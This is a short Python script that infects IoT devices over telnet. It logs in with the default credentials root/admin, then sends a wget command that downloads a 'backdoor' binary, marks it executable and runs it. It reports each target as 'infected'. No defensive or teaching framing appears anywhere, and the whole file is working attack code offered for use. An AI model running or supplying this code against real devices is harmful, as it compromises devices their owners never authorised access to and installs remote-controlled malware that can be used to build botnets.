import telnetlib
import sys

def infect_iot(target):
    try:
        tn = telnetlib.Telnet(target)
        tn.read_until(b"login: ")
        tn.write(b"root\n")
        tn.read_until(b"Password: ")
        tn.write(b"admin\n")
        tn.write(b"wget http://127.0.0.1/backdoor && chmod +x backdoor && ./backdoor\n")
        print(f"Infected IoT device at {target}")
    except:
        print(f"Failed to infect {target}")

def main():
    target = input("Enter target IP: ")
    infect_iot(target)

if __name__ == "__main__":
    main()

